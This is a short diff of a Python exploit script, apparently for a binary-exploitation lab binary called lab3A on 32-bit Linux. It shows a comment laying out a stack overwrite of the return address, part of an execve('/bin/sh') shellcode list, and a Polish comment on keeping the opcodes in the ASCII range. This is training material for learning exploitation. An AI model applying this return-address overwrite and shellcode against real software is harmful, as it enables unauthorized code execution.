@@ -16,7 +16,7 @@ context(arch ='i386', os ='linux')
 # 0x0 [index 109] [Overwritten RA]
 # 0x4 [index 110] /bin
 # 0x8 [index 111] reserved for quend!
-# 0xC [index 112] //sh
+# 0xC [index 112] /sh
 # 0x10 [index 113] 0xB
 
 # Script usage: python lab3a.py | ./lab3A
@@ -38,7 +38,7 @@ sh = [
     "mov ecx, edi",
     "mov edx, edi",
     "int  0x80",
-]
+] # [!] <--- Ważne jest to aby opkody shellcode'u były w zakresie ASCII (z racji jego podania w poleceniu przekazywanym do aplikacji. Jeżeli nie są to aplikacja się wywala. Dlatego m.in rzeczy sa zdejmowane ze stosu, i nic na niego nie jest wrzucane ze stringów.
 
 shellcode = ''
 
